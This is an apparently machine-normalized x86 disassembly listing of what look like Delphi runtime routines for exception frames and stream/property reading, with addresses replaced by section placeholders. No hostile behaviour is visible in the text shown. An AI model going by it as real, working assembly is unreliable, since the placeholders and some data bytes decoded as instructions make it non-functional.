mov ebx eax
xor eax eax
push ebp
push sub_41d731
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404014
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d738
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
sub_41d75c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d92c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4037f8#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41e254
xor edx edx
push ebp
push j_sub_4037f8#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40423c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40449c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40342c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414f04
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40342c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414f04
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41dae0
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c9e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c9e0
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414ff8
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41d740
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d933
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edi ebx
jmp r-xdata
sub_41d8e6
add [ eax ] eax
add [ eax ] al
sub [ edx + 0x40 ] dh
add dl dh
fadd [ ecx ]
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_4039e0
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d933
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_41d93c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41862c
mov ebx eax
test ebx ebx
je r-xdata
call sub_41c4cc
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41506c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d984
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bf60
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418c68
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d9c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41da13
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eb48
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41588c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da1a
lea eax [ ebp - 0x10 ]
call sub_40f234
retn
sub_41da20
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41dad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c9d0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d440
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bf60
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418c68
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e430
lea eax [ ebp - 0x4 ]
call sub_4058a0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415a28
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dad9
lea eax [ ebp - 0x8 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_41dae0
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dddb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dde2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0x24 ]
call sub_40465c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fa0
retn
jmp [ eax * 4 + jump_table_41db70 ]
mov eax [ rw-data ]
call sub_41c4b4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ff8
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9d0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca90
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41506c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d440
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414ea0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41506c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d324
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415640
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41e290
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415340
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41e34c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415454
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e174
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41506c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9d0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9d0
cmp al 0xd
jne r-xdata
push ebp
call sub_41d9c4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5ac
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41596c
jmp r-xdata
push ebp
call sub_41da20
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ff8
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d540
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41506c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d440
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d93c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e430
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41506c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41d440
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e430
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41590c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e430
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ff8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41cae8
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41590c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d440
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d984
pop ecx
jmp r-xdata
sub_41dde8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403fd0
jmp r-xdata
mov eax [ ebx ]
call sub_4187c4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409070
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41de48
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e163
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e230
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41e141
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e102
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41e254
mov eax [ ebp - 0x1c ]
call sub_41831c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41dde8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403134
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41806c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41e0a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405fd0
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418c68
xor eax eax
push ebp
push sub_41e087
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418e20
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e08e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4031ec
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418dc4
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41e0d8
call sub_4027fc
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a34
jmp r-xdata
call sub_4039e0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41c1dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e148
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41e107
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41c384
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_4039e0
call sub_403a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e148
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4031ec
sub_41e174
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e21e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e1f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e430
cmp al 0xb
je r-xdata
mov eax ebx
call sub_414d70
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41c4cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41c504
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e225
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41e254
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c9f4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40406c
mov eax esi
call j_sub_404448
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c9f4
pop edx
pop esi
pop ebx
retn
sub_41e290
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e33d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c9d0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41e34c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404204
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e344
lea eax [ ebp - 0x8 ]
call sub_40465c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e430
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c9f4
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045c8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c9f4
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c9f4
jmp r-xdata
jmp r-xdata
call sub_41c4cc
sub_41e34c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e423
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c9d0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41e290
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047a8
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e42a
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41e430
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c9f4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048a4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c9f4
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c9f4
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045c8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c9f4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405c70
jmp r-xdata
jmp r-xdata
call sub_41c4cc
sub_41e444
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e480
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e254
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e487
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41e48c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c68c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e540
mov eax [ ebx ]
call sub_41d5f8
pop ebx
pop ebp
retn
sub_41e4b4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c9f4
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e938
pop ebx
pop ecx
pop ebp
retn
sub_41e4e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c68c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c9d0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41d5f8
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e938
jmp r-xdata
mov eax [ ebx ]
call sub_41e540
mov eax [ ebx ]
call sub_41c68c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e6dc
mov eax [ ebx ]
call sub_41d5f8
sub_41e540
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e6cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e430
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6d6
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
jmp [ eax * 4 + jump_table_41e577 ]
push ebp
call sub_41e48c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e254
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e4b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e444
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e4b4
pop ecx
jmp r-xdata
push ebp
call sub_41e4e4
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
push ebp
mov eax 0x2
call sub_41e4b4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e938
jmp r-xdata
push ebp
mov eax 0x1
call sub_41e4b4
pop ecx
sub_41e6dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e719
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e254
mov eax ebx
call sub_41e540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e720
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41e724
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41e7bc
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41c68c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41e254
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41e254
jmp r-xdata
mov eax ebx
call sub_41e6dc
mov eax ebx
call sub_41d5f8
jmp r-xdata
mov eax ebx
call sub_41c68c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e724
mov eax ebx
call sub_41d5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7c3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
sub_41e7cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
